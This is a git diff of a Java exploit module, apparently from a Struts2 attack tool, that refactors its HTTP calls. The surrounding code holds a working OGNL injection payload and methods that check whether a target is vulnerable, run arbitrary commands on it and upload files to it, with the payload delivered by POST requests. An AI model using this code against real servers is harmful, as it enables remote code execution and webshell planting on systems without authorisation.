@@ -1,11 +1,11 @@
 package fun.fireline.exp;
 
-import fun.fireline.controller.MainController;
 import fun.fireline.core.ExploitInterface;
-import fun.fireline.tools.HttpTool;
-import org.apache.log4j.Logger;
+import fun.fireline.tools.HttpTools;
+import fun.fireline.tools.Response;
 
 import java.net.URLEncoder;
+import java.util.HashMap;
 import java.util.UUID;
 
 /**
@@ -18,6 +18,7 @@ import java.util.UUID;
 public class Example implements ExploitInterface {
     private String target = null;
     private boolean isVul = false;
+    private HashMap<String, String> headers = new HashMap();
 
     private String payload = "('\\43_memberAccess.allowStaticMethodAccess')(a" +
             ")=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')" +
@@ -38,55 +39,49 @@ public class Example implements ExploitInterface {
             "(('\\43xman.getWriter().println(\\43req.getRealPath(\"\\u005c\"))')(d))&(i99)" +
             "(('\\43xman.getWriter().close()')(d))";
 
+
     // 检测漏洞是否存在
     @Override
-    public boolean checkVul(String url) {
-        String uuid =  UUID.randomUUID().toString();   // 这里可以通过随机生成的 UUID 判断回显来验证漏洞是否存在，有其他方法更好。
+    public String checkVul(String url) {
+        // 这里可以通过随机生成的 UUID 判断回显来验证漏洞是否存在，有其他方法更好。
+        String uuid =  UUID.randomUUID().toString();
         this.target = url;
-        try {
-            // 替换payload 中的 payload 字符，为输出UUID
-            String data = this.payload.replace("payload", "echo " + uuid);
-            // post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues
-            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, "UTF-8");
-            // 看回显，是否存在UUID
-            boolean flag = result.contains(uuid);
 
-            if(flag) {
-                this.isVul = true;  // 存在漏洞
-            }
-            return flag;
-        } catch (Exception e) {
-            logger.error(e);
+        // 添加header头
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        // 替换payload 中的 payload 字符，为输出UUID
+        String data = this.payload.replace("payload", "echo " + uuid);
+        // post 请求，根据不同的exp，可能需要不同的请求方式，看需更改
+        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");
+
+        // 看回显，是否存在 202cb962ac59075b964b07152d234b70
+        if(response.getText() != null  && response.getText().contains(uuid)) {
+            this.isVul = true;
+            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
+        } else if (response.getError() != null) {
+            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
+        } else {
+            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
         }
-        return false;
+
     }
 
     // 命令执行
     @Override
     public String exeCmd(String cmd, String encoding) {
-        try {
-            // 替换payload 中的 payload 字符为要执行的命令
-            String data = this.payload.replace("payload", cmd);
-            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, encoding);
-            return result;
+        // 替换payload 中的 payload 字符为要执行的命令
+        String data = this.payload.replace("payload", cmd);
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        Response response = HttpTools.post(this.target, data, headers, encoding);
+        return response.getText();
 
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "fail";
     }
 
     // 获取当前的web路径，有最好，没有也无所谓
     @Override
     public String getWebPath() {
-        try {
-            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", webPath, "UTF-8");
-            return result;
-
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "命令执行失败";
+        Response response = HttpTools.post(this.target, webPath, headers, "UTF-8");
+        return response.getText();
     }
 
 
@@ -119,8 +114,10 @@ public class Example implements ExploitInterface {
                 "(d))=&t=" + fileContent;
 
 
-        String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", payload, "UTF-8");
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        Response response = HttpTools.post(this.target, payload, headers, "UTF-8");
 
+        String result = response.getText();
         // 也是对输出随机UUID是否一致来判断是否成功的，有其他方法也可以自行改判断
         if(result.contains(uuid)) {
             result = result + "  上传成功! ";
@@ -129,7 +126,6 @@ public class Example implements ExploitInterface {
         }
 
         return result;
-
     }
 
     // 漏洞是否存在
